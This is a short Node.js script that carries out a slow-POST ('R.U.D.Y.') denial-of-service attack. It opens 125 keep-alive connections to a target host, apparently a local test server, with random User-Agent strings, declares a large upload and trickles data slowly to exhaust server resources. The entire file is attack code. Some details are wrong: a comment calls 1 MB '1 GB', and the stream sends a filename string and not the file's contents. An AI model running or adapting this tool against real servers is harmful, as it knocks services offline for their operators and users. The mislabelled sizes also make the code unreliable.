const request = require('request')
const useragent = require('random-useragent')
const rp = require('request-promise')
const fs = require('fs')

let stream = fs.createReadStream('payload.txt')

const host = 'http://127.0.0.1:3000'
const connections = 125

function setupStream() {
  stream._read = () => {
    setTimeout(() => {
      console.log('Sending 1B of data')
      stream.push('payload.txt')
    }, (Math.random() * 10 + 1) * 1000)
  }
}

const options = {
  method: 'POST',
  uri: host,
  headers: {
    'Connection': 'keep-alive',
    'Content-Length': '1048576', //1 GB of data
    'User-Agent': useragent.getRandom()
  },
  formData: {
    file: stream
  }
}

rudyAttack()

function rudyAttack() {
  console.log('---Attack initiated---')
  for(let i = 0; i < connections; i++) {
    setupStream()
    attack()
  }
}

function attack() {
  rp(options)
  .then(() => {
    closeStream()
  })
  .catch(err => {
    console.error('An error occured while sending request')
    closeStream()
  })
}

function closeStream() {
  stream.close()
}

